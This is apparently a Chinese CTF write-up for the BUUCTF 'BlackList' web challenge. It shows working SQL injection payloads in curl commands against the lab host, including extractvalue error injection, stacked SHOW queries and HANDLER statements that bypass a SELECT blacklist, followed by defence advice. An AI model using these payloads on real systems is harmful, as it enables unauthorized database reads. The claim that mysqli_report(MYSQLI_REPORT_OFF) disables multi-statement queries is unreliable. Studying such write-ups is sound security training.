---
title: "BlackList — SQL 注入黑名单绕过（HANDLER 堆叠注入）"
date: 2026-05-13
categories:
  - BUUCTF
  - WEB
---

# BlackList — SQL 注入黑名单绕过（HANDLER 堆叠注入）

## 题目信息

- **URL**: `http://d86fe6da-89b0-4a45-98fe-24a1f9d06178.node5.buuoj.cn:81/`
- **类型**: WEB — SQL 注入
- **技术栈**: OpenResty (Nginx) + PHP 7.3.11 + MariaDB 10.3.18

## 信息收集

### 页面分析

访问目标 URL，页面显示一个简单的 GET 表单：

```html
<h1>Black list is so weak for you,isn't it</h1>
<form method="get">
    姿势: <input type="text" name="inject" value="1">
    <input type="submit">
</form>
<pre></pre>
```

关键信息：
- 参数 `inject` 通过 GET 方法传递
- 提示 "Black list is so weak" 暗示存在黑名单过滤
- 页面需要 `Referer` 头才能正常处理请求（反自动化）

### SQL 注入确认

```bash
curl -s -H "Referer: http://xxx.node5.buuoj.cn:81/" \
  "http://xxx.node5.buuoj.cn:81/?inject=1"
# 返回: array(2) { [0]=> string(1) "1" [1]=> string(7) "hahahah" }

curl -s -H "Referer: http://xxx.node5.buuoj.cn:81/" \
  "http://xxx.node5.buuoj.cn:81/?inject=1'"
# 返回: error 1064 : You have an error in your SQL syntax...
#       near ''1''' at line 1

curl -s -H "Referer: http://xxx.node5.buuoj.cn:81/" \
  "http://xxx.node5.buuoj.cn:81/?inject=2"
# 返回: array(2) { [0]=> string(1) "2" [1]=> string(12) "miaomiaomiao" }
```

确认：
- 存在 SQL 注入，数据库为 MariaDB
- SQL 查询结构大致为：`SELECT id, data FROM words WHERE id = '$inject'`
- `id=1` → `hahahah`，`id=2` → `miaomiaomiao`，`id=114514` → `ys`

## 漏洞分析

### 黑名单测试

尝试直接 UNION SELECT 注入：

```bash
# UNION SELECT 被拦截
?inject=-1' union select 1,2 -- -
# → 返回空（被黑名单过滤）
```

系统地测试了以下关键词，均被黑名单拦截：

`union`, `select`, `from`, `where`, `or`, `and`, `handler`, `prepare`, `execute`, `set`, `concat`, `group_concat`, `substr`, `mid`, `sleep`, `benchmark`, `information_schema`, `updatexml`

### 发现绕过方法

**1. `||` 运算符（OR 的替代）**

```bash
?inject=0' || 1=1 -- -
# 返回所有 3 行数据：id=1,2,114514
```

**2. `extractvalue` 错误注入**

`extractvalue` 函数未被黑名单拦截，可用于错误注入：

```bash
?inject=0' || extractvalue(1,concat(0x7e,database())) -- -
# → error 1105 : XPATH syntax error: '~supersqli'
# 数据库名: supersqli

?inject=0' || extractvalue(1,concat(0x7e,version())) -- -
# → version: 10.3.18-MariaDB

?inject=0' || extractvalue(1,concat(0x7e,user())) -- -
# → user: root@localhost
```

但子查询中的 `SELECT` 仍被拦截，无法通过 `extractvalue` + 子查询获取表数据。

**3. 堆叠注入 + SHOW**

堆叠查询可行：

```bash
?inject=0'; show tables; -- -
# 返回两张表：
#   - FlagHere
#   - words

?inject=0'; show columns from FlagHere; -- -
# FlagHere 表结构：
#   flag | varchar(100)

?inject=0'; show columns from words; -- -
# words 表结构：
#   id   | int(10)
#   data | varchar(20)
```

**4. HANDLER 语句绕过**

`HANDLER` 单独作为 `inject` 值时返回空（被误判为黑名单），但在堆叠查询中实际未被过滤：

```bash
?inject=0'; handler FlagHere open; handler FlagHere read first; -- -
# 成功执行！返回 FlagHere 表的第一行数据
```

> **HANDLER 原理**：MariaDB 的 `HANDLER` 语句可以直接读取表数据，无需使用 `SELECT`。语法为 `HANDLER table_name OPEN` 打开表，`HANDLER table_name READ FIRST/LAST/NEXT/PREV` 逐行读取。

## 漏洞利用

### 完整攻击流程

1. **确认注入点与数据库信息**

```bash
# 测试 SQL 注入
curl -s -H "Referer: http://xxx.node5.buuoj.cn:81/" \
  "http://xxx.node5.buuoj.cn:81/?inject=1'" | grep '<pre>'
# 返回 SQL 语法错误 → 确认注入点

# 获取数据库名
curl -s -H "Referer: http://xxx.node5.buuoj.cn:81/" \
  "http://xxx.node5.buuoj.cn:81/?inject=0'%20||%20extractvalue(1,concat(0x7e,database()))%20--%20-"
# → supersqli
```

2. **枚举数据库表**

```bash
curl -s -H "Referer: http://xxx.node5.buuoj.cn:81/" \
  "http://xxx.node5.buuoj.cn:81/?inject=0';%20show%20tables;%20--%20-"
# → FlagHere, words
```

3. **查看 FlagHere 表结构**

```bash
curl -s -H "Referer: http://xxx.node5.buuoj.cn:81/" \
  "http://xxx.node5.buuoj.cn:81/?inject=0';%20show%20columns%20from%20FlagHere;%20--%20-"
# → 列: flag (varchar(100))
```

4. **使用 HANDLER 读取 Flag**

```bash
curl -s -H "Referer: http://xxx.node5.buuoj.cn:81/" \
  "http://xxx.node5.buuoj.cn:81/?inject=0';HANDLER%20FlagHere%20OPEN;HANDLER%20FlagHere%20READ%20FIRST;--%20-"
```

## 获取 Flag

```
flag{93632c25-ed42-48e1-ab37-25559d736d2d}
```

## 知识点总结

### 涉及技术

- **SQL 注入基础**：GET 参数注入，MariaDB 数据库
- **黑名单绕过**：
  - `||` 替代 `OR` 运算符
  - `&&` 替代 `AND` 运算符
  - `extractvalue()` 错误注入绕过（可用于无回显场景）
  - `HANDLER` 语句绕过 `SELECT` 过滤器
- **堆叠注入**：利用 `;` 分隔多条 SQL 语句
- **信息收集**：`SHOW TABLES`、`SHOW COLUMNS` 枚举数据库结构

### 工具与方法

| 工具/方法 | 作用 |
|-----------|------|
| `curl` | 发送 HTTP 请求，控制 Referer 头 |
| `extractvalue()` | MariaDB 错误注入函数，用于读取无回显数据 |
| `HANDLER` | MariaDB 表读取语句，可绕过 SELECT 黑名单 |
| `SHOW TABLES/COLUMNS` | 枚举数据库结构，无需 SELECT |
| `| |` 运算符 | 替代 OR，绕过关键词过滤 |

### HANDLER 绕过原理

在 MariaDB/MySQL 中，`HANDLER` 语句提供了一种低级别的表访问方式：

```sql
HANDLER table_name OPEN;              -- 打开表句柄
HANDLER table_name READ FIRST;        -- 读取第一行
HANDLER table_name READ NEXT;         -- 读取下一行
HANDLER table_name CLOSE;             -- 关闭表句柄
```

与 `SELECT` 不同，`HANDLER` 不经过 SQL 优化器，直接访问存储引擎层数据。本题的黑名单覆盖了 `SELECT`/`UNION` 等常见关键词，但遗漏了 `HANDLER`，使得攻击者可以不使用 `SELECT` 即可读取任意表数据。

### 防御建议

1. **使用参数化查询（Prepared Statement）**，从根源上杜绝 SQL 注入
2. **避免依赖黑名单过滤**，黑名单总有遗漏（如 `HANDLER`、`||`）
3. **禁用多语句查询**（`mysqli_report(MYSQLI_REPORT_OFF)` 或设置 `multi_query` 限制）
4. **最小化数据库用户权限**，限制对敏感表的直接读权限
